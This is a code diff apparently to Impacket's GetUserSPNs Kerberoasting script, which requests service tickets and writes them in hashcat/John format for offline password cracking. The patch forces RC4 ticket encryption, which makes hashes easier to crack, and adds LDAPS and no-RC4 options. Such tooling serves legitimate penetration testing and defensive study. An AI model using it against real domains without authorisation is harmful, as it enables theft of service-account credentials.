@@ -30,8 +30,6 @@
 #   [X] Add the capability for requesting TGS and output them in JtR/hashcat format
 #
 
-from __future__ import division
-from __future__ import print_function
 import argparse
 import logging
 import sys
@@ -47,10 +45,11 @@ from impacket.examples.utils import parse_identity, ldap_login
 from impacket.krb5 import constants
 from impacket.krb5.asn1 import TGS_REP, AS_REP
 from impacket.krb5.ccache import CCache
-from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, RC4_PREFERRED_TGS_ENCTYPES
 from impacket.krb5.types import Principal
 from impacket.ldap import ldap, ldapasn1
 from impacket.ntlm import compute_lmhash, compute_nthash
+from impacket import wintime
 
 
 class GetUserSPNs:
@@ -81,6 +80,7 @@ class GetUserSPNs:
         self.__nthash = ''
         self.__no_preauth = cmdLineOptions.no_preauth
         self.__outputFileName = cmdLineOptions.outputfile
+        self.__noRC4 = cmdLineOptions.no_rc4
         self.__usersFile = cmdLineOptions.usersfile
         self.__aesKey = cmdLineOptions.aesKey
         self.__doKerberos = cmdLineOptions.k
@@ -93,6 +93,7 @@ class GetUserSPNs:
         self.__stealth = cmdLineOptions.stealth
         self.__machineOnly = cmdLineOptions.machine_only
         self.__requestMachine = cmdLineOptions.request_machine
+        self.__ldaps = cmdLineOptions.ldaps_flag
 
         if cmdLineOptions.hashes is not None:
             self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')
@@ -114,12 +115,6 @@ class GetUserSPNs:
             self.__kdcIP = None
             self.__kdcHost = None
 
-    @staticmethod
-    def getUnixTime(t):
-        t -= 116444736000000000
-        t /= 10000000
-        return t
-
     def getTGT(self):
         domain, _, TGT, _ = CCache.parseFile(self.__domain)
         if TGT is not None:
@@ -132,7 +127,7 @@ class GetUserSPNs:
         # password to ntlm hashes (that will force to use RC4 for the TGT). If that doesn't work, we use the
         # cleartext password.
         # If no clear text password is provided, we just go with the defaults.
-        if self.__password != '' and (self.__lmhash == '' and self.__nthash == ''):
+        if self.__password != '' and (self.__lmhash == '' and self.__nthash == '') and not self.__noRC4:
             try:
                 tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, '', self.__domain,
                                                                         compute_lmhash(self.__password),
@@ -237,7 +232,7 @@ class GetUserSPNs:
             return
 
         # Connect to LDAP
-        ldapConnection = ldap_login(self.__target, self.baseDN, self.__kdcIP, self.__kdcHost, self.__doKerberos, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, target_domain=self.__targetDomain, fqdn=True)
+        ldapConnection = ldap_login(self.__target, self.baseDN, self.__kdcIP, self.__kdcHost, self.__doKerberos, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, ldaps_flag=self.__ldaps, target_domain=self.__targetDomain, fqdn=True)
         # updating "self.__target" as it may have changed in the ldap_login processing
         self.__target = ldapConnection._dstHost
 
@@ -324,12 +319,12 @@ class GetUserSPNs:
                         if str(attribute['vals'][0]) == '0':
                             pwdLastSet = '<never>'
                         else:
-                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
+                            pwdLastSet = str(wintime.filetime_to_datetime(int(str(attribute['vals'][0]))))
                     elif str(attribute['type']) == 'lastLogon':
                         if str(attribute['vals'][0]) == '0':
                             lastLogon = '<never>'
                         else:
-                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
+                            lastLogon = str(wintime.filetime_to_datetime(int(str(attribute['vals'][0]))))
                     elif str(attribute['type']) == 'servicePrincipalName':
                         for spn in attribute['vals']:
                             SPNs.append(spn.asOctets().decode('utf-8'))
@@ -373,7 +368,8 @@ class GetUserSPNs:
                         tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                                 self.__kdcIP,
                                                                                 TGT['KDC_REP'], TGT['cipher'],
-                                                                                TGT['sessionKey'])
+                                                                                TGT['sessionKey'],
+                                                                                etypes=RC4_PREFERRED_TGS_ENCTYPES)
                         self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName,
                                        self.__targetDomain + "/" + sAMAccountName, fd)
                     except Exception as e:
@@ -432,7 +428,8 @@ class GetUserSPNs:
                     tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,
                                                                             self.__kdcIP,
                                                                             TGT['KDC_REP'], TGT['cipher'],
-                                                                            TGT['sessionKey'])
+                                                                            TGT['sessionKey'],
+                                                                            etypes=RC4_PREFERRED_TGS_ENCTYPES)
                     self.outputTGS(tgs, oldSessionKey, sessionKey, username, username, fd)
                 except Exception as e:
                     logging.debug("Exception:", exc_info=True)
@@ -473,6 +470,7 @@ if __name__ == '__main__':
                                                                           '<username>.ccache. Auto selects -request')
     parser.add_argument('-outputfile', action='store',
                         help='Output filename to write ciphers in JtR/hashcat format. Auto selects -request')
+    parser.add_argument('-no-rc4', action='store_true', default=False, help='Does not force RC4-HMAC for the TGT')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output.')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
 
@@ -496,7 +494,8 @@ if __name__ == '__main__':
     group.add_argument('-dc-host', action='store', metavar='hostname', help='Hostname of the domain controller to use. '
                                                                             'If ommited, the domain part (FQDN) '
                                                                             'specified in the account parameter will be used')
-
+    group.add_argument('-ldaps', '-use-ldaps', dest='ldaps_flag', action='store_true',
+                       help='Use LDAPS instead of LDAP')
     if len(sys.argv) == 1:
         parser.print_help()
         sys.exit(1)
